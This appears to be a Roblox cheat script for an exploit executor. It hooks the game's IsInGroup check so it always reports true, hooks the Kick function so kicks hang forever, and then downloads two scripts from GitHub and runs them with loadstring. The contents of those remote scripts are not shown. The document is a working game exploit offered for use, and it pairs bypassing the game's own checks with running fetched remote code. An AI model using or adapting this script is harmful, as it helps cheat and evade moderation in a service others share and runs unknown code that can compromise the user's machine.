hookfunction(game:GetService("Players").LocalPlayer.IsInGroup, function(...)
    warn("IsInGroup -> true")
    return true
end)

hookfunction(game:GetService("Players").LocalPlayer.Kick, function(...)
    warn("Kick attempted.")
    return task.wait(math.huge)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/Counter/main/Cash"))()